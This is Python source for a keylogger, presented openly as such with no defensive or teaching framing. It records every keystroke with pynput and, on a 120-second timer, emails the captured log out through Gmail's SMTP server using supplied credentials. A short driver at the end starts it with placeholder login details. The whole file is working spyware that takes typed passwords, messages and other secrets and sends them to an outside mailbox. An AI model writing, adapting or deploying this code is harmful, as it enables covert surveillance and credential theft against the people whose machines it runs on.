#!/usr/bin/env python
import pynput.keyboard, threading, smtplib

log=""

class Keylogger:

    def __init__(self, time_interval, email, password):
        self.log="Keylogger started"
        self.interval=time_interval
        self.email=email
        self.password=password

    def append_to_log(self, string):
        self.log=self.log+ string

    def process_key_press(self, key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:
                current_key= " " + str(key) + " "
        self.append_to_log(current_key)


    def report(self):
        self.send_mail(self.email, self.password, "\n\n"+ self.log)
        self.log=""
        #threading for report and keylogging to run simultaneously
        timer=threading.Timer(self.interval,self.report)
        timer.start()


    def send_mail(self, email, password, message):
        #google server and port for SMTP server instance to send a mail
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        #send mail to myself the info of the executed command
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


import keylogger
my_keylogger = keylogger.Keylogger(120, "email", "password")
my_keylogger.start()

